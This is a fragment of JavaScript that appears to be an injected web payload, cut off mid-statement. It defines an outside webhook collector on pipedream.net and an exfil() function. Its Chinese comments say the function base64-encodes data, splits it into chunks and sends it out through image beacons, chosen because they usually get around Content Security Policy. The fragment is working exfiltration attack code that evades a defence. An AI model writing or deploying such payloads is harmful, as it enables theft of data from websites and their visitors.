(function() {
  const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
  const TARGET = location.origin;
  
  // 函式:把資料切段用 img beacon 送出(img 通常繞得過 CSP)
  function exfil(tag, data) {
    const b64 = btoa(unescape(encodeURIComponent(String(data))));
    // 切段 (URL 最長 ~2000 char)
    const chunk = 1500;
    for (let i = 0; i < b64.length; i += chunk) {
      const img = new
